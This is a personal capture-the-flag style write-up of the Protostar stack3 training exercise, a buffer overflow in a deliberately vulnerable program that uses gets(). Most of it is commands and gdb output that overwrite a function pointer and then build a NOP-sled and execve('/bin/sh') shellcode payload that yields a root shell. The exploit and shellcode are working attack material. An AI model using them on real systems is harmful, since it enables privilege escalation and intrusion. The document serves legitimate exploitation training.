{{ Exploit Exercises: Protostar - 0x01 - Stack 3

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack3/

        About:
        Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

        Hints:
            → both gdb and objdump is your friend you determining where the win() function lies in memory.

    }}

    [x] {{ Intended Solution

        # Checking behavior when used as expected
        user@protostar:/opt/protostar/bin$ ./stack3
        fubar

        # Checking behavior when overflowing the buffer
        user@protostar:/opt/protostar/bin$ printf 'A%.0s' {1..100} | ./stack3
        calling function pointer, jumping to 0x41414141
        Segmentation fault

        # Loading the program into gdb and disassembling the main() function
        user@protostar:/opt/protostar/bin$ gdb stack3 -q
        Reading symbols from /opt/protostar/bin/stack3...done.
        (gdb) disassemble main
        Dump of assembler code for function main:
        0x08048438 <main+0>:    push   %ebp
        0x08048439 <main+1>:    mov    %esp,%ebp
        0x0804843b <main+3>:    and    $0xfffffff0,%esp
        0x0804843e <main+6>:    sub    $0x60,%esp
        0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
        0x08048449 <main+17>:   lea    0x1c(%esp),%eax
        0x0804844d <main+21>:   mov    %eax,(%esp)
        0x08048450 <main+24>:   call   0x8048330 <gets@plt>
        0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
        0x0804845a <main+34>:   je     0x8048477 <main+63>
        0x0804845c <main+36>:   mov    $0x8048560,%eax
        0x08048461 <main+41>:   mov    0x5c(%esp),%edx
        0x08048465 <main+45>:   mov    %edx,0x4(%esp)
        0x08048469 <main+49>:   mov    %eax,(%esp)
        0x0804846c <main+52>:   call   0x8048350 <printf@plt>
        0x08048471 <main+57>:   mov    0x5c(%esp),%eax
        0x08048475 <main+61>:   call   *%eax
        0x08048477 <main+63>:   leave
        0x08048478 <main+64>:   ret
        End of assembler dump.

        # Disassembling win() function
        (gdb) disassemble win
        Dump of assembler code for function win:
        0x08048424 <win+0>: push   %ebp
        0x08048425 <win+1>: mov    %esp,%ebp
        0x08048427 <win+3>: sub    $0x18,%esp
        0x0804842a <win+6>: movl   $0x8048540,(%esp)
        0x08048431 <win+13>:    call   0x8048360 <puts@plt>
        0x08048436 <win+18>:    leave
        0x08048437 <win+19>:    ret
        End of assembler dump.

        # From the above output it looks like main is at memory address 0x08048424. Let's also have a look at the objdump
        user@protostar:/opt/protostar/bin$ objdump -M intel -D stack3 | grep "<.*>:"
        ....
        08048424 <win>:
        08048438 <main>:
        ....

        # With this information it's time to update the payload to fill the variable 'fp' with the address of win()
        user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
        calling function pointer, jumping to 0x08048424
        code flow successfully changed

    }}

    [x] {{ Root shell

        # Generate pattern
        > ./pattern.py -c 150
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

        # Write the pattern string to a file, load program and run it with the file as input
        user@protostar:~$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9 > stack3
        user@protostar:/opt/protostar/bin$ gdb stack3 -q
        Reading symbols from /opt/protostar/bin/stack3...done.
        (gdb) r < ~/stack3
        Starting program: /opt/protostar/bin/stack3 < ~/stack3
        calling function pointer, jumping to 0x63413163

        Program received signal SIGSEGV, Segmentation fault.
        0x63413163 in ?? ()
        (gdb)

        # Get offset
        > ./pattern.py -ol 63413163
        [+] Offset found at 64 bytes

        # Verify offset
        user@protostar:~$ python -c 'print "A"*64 + "BBBB"' > stack3
        (gdb) r < ~/stack3
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack3 < ~/stack3
        calling function pointer, jumping to 0x42424242

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()
        (gdb) i r eip
        eip            0x42424242   0x42424242

        # Reuse shellcode from previous exercises
        # Buffer (64 bytes) minus shellcode (24 bytes) leaves 40 bytes for the nopsled
        user@protostar:~$ python -c 'print "\x90"*40 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "JUNK"' > stack3

        # JUNK is just 4 bytes of, well, junk to crash the program. These 4 bytes will be replaced with a memory address
        # inside the nopsled
        (gdb) r < ~/stack3
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack3 < ~/stack3
        calling function pointer, jumping to 0x4b4e554a

        Program received signal SIGSEGV, Segmentation fault.
        0x4b4e554a in ?? ()

        # Looking at the stack to find a memory address to use
        (gdb) x/80x $esp-150
        ....
        0xbffff766: 0xf778b7ec  0x9090bfff  0x90909090  0x90909090
        0xbffff776: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff786: 0x90909090  0x90909090  0x90909090  0xec839090
        0xbffff796: 0x580b6a7f  0x2f685299  0x6868732f  0x6e69622f
        ....

        # Replacing JUNK with \x76\xf7\xff\xbf
        user@protostar:~$ python -c 'print "\x90"*40 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x76\xf7\xff\xbf"' > stack3

        # Running the program again with the new return address
        (gdb) r < ~/stack3
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack3 < ~/stack3
        calling function pointer, jumping to 0xbffff776
        Executing new program: /bin/dash

        Program exited normally.

        # Successfully executed without crashing. Time to try outside gdb
        user@protostar:/opt/protostar/bin$ cat /home/user/stack3 | ./stack3
        calling function pointer, jumping to 0xbffff776
        Segmentation fault

        # Core dump here I come
        user@protostar:/opt/protostar/bin$ cp stack3 /tmp/
        user@protostar:/opt/protostar/bin$ cd /tmp/
        user@protostar:/tmp$ cat /home/user/stack3 | ./stack3
        calling function pointer, jumping to 0xbffff776
        Segmentation fault

        # For some reason core was not dumped. Issuing ulimit -c unlimited again to see if that solves it
        user@protostar:/tmp$ ulimit -c unlimited
        user@protostar:/tmp$ cat /home/user/stack3 | ./stack3
        calling function pointer, jumping to 0xbffff776
        Segmentation fault (core dumped)

        # Yup, perfect. Loading the program and core dump into gdb
        user@protostar:/tmp$ gdb stack3 core.11.stack3.3420 -q
        Reading symbols from /tmp/stack3...done.

        warning: Can't read pathname for load map: Input/output error.
        Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/libc.so.6
        Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/ld-linux.so.2
        Core was generated by `./stack3'.
        Program terminated with signal 11, Segmentation fault.
        #0  0xbffff776 in ?? ()

        # Locating the nopsled on the stack
        (gdb) x/80x $esp-150
        ....
        0xbffff7a6: 0xf7b8b7ec  0x9090bfff  0x90909090  0x90909090
        0xbffff7b6: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7c6: 0x90909090  0x90909090  0x90909090  0xec839090
        ....

        # Updating the payload - changing the value of eip from \x76\xf7\xff\xbf to \xb6\xf7\xff\xbf
        user@protostar:~$ python -c 'print "\x90"*40 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xb6\xf7\xff\xbf"' > stack3

        # Running the original program with the new payload
        user@protostar:/opt/protostar/bin$ cat /home/user/stack3 | ./stack3
        calling function pointer, jumping to 0xbffff7b6

        # No crash, but also no shell. Trying the trickery I learned in an earlier exercise
        user@protostar:/opt/protostar/bin$ (cat /home/user/stack3; cat) | ./stack3
        calling function pointer, jumping to 0xbffff7b6
        whoami
        root
        id
        uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

    }}

    [~] {{ What did I learn?

        → Objdump
            → Use the -D switch to disassemble everything, and grep the output with this pattern "<.*>:" to see the name
              of all the executable sections in the program
            → Using the -M switch with the 'intel' option will output using the intel style
        → In gdb, executing 'disassemble <function>' returns the assembly code for a function
            → The first address shown is the address that must be in EIP to make the change program's flow and call
    }}

}}